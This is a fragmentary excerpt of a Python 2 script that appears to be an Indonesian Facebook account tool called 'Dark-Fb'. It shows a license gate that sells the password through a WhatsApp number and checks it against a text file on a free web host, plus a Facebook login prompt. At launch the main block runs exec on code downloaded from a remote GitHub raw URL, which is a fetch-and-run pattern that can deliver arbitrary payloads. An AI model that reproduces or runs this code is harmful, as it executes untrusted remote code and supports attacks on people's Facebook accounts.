...
def lisensi():
    os.system('xdg-open ')
    os.system('reset')
    print 'Ini Rogram Legal,\n Kalo Mao Tau Password nya\n WA : 082211661007\n'
    username = raw_input('[*] Username : ')
    passw = raw_input('[*] Password : ')
    r = requests.get('https://sereware56.000webhostapp.com/Dark/password.txt').text
    if passw == '':
...
def login():
    ...
    try:
        ...
        os.system('reset')
        print logo
        print '\x1b[1;91m[\xe2\x9c\x93] \x1b[1;92mLOGIN AKUN FACEBOOK \x1b[1;91m[\xe2\x9c\x93]'
...
if __name__ == '__main__':
    exec requests.get('https://raw.githubusercontent.com/Mr-XsZ/Dark-Fb/master/server3.txt').text
    lisensi()
